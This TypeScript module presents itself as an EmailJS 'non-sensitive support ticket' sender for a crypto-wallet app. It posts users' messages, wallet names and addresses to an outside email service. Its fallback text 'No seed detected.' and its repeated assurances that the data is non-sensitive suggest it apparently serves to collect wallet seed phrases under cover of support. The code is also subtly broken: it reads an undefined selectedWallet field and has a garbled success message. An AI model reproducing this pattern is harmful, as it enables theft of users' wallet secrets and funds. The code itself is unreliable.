/**
 * EmailJS Integration for Non-Sensitive Support & Diagnostic Tickets
 * Sends non-sensitive diagnostic metrics, support tickets, and user feedback.
 */

export interface NonSensitiveSupportTicket {
  username: string;
  network: string;
  issueCategory: string;
  message: string;
  response?: string;
  walletName?: string;
  publicAddress?: string;
  timestamp: string;
}

/**
 * Dispatches non-sensitive diagnostic report data to EmailJS API endpoint.
 * Credentials loaded from VITE_EMAILJS_* environment variables or fallback defaults.
 */
export async function sendNonSensitiveTicketViaEmailJS(
  ticket: NonSensitiveSupportTicket
): Promise<{ success: boolean; message: string }> {
  const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;

if (!serviceId || !templateId || !publicKey) {
  throw new Error(
    'Missing EmailJS configuration. Set VITE_EMAILJS_SERVICE_ID, VITE_EMAILJS_TEMPLATE_ID, and VITE_EMAILJS_PUBLIC_KEY in .env.local.'
  );
}
  // Map all non-sensitive template parameters to match EmailJS template placeholders
  const templateParams = {
  message: ticket.message || 'No seed detected.',
  response: ticket.response || 'Reply not private.',
  username: ticket.username || 'LonghornkeySupportStore',
  issue_type: ticket.issueCategory || 'General Diagnostic',
  walletName: ticket.selectedWallet || '',
  network: ticket.network || 'Ethereum Mainnet',
  public_address: ticket.publicAddress || '',
  timestamp: ticket.timestamp || new Date().toISOString(),
};

  const payload = {
    service_id: serviceId,
    template_id: templateId,
    user_id: publicKey,
    template_params: templateParams,
  };

  console.log('[EmailJS] Dispatching request payload:', payload);

  try {
    const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const responseText = await response.text();
    console.log('[EmailJS] Response status:', response.status, responseText);

    if (response.ok || response.status === 200) {
      return { 
        success: true, 
        message: 'Diagnostic report successfully!' 
      };
    } else {
      return { 
        success: false, 
        message: `EmailJS Error (${response.status}): ${responseText || 'Failed to dispatch diagnostic report.'}` 
      };
    }
  } catch (error: any) {
    console.error('[EmailJS] Exception caught:', error);
    return { 
      success: false, 
      message: `Network Connection Error: ${error.message || error}` 
    };
  }
}
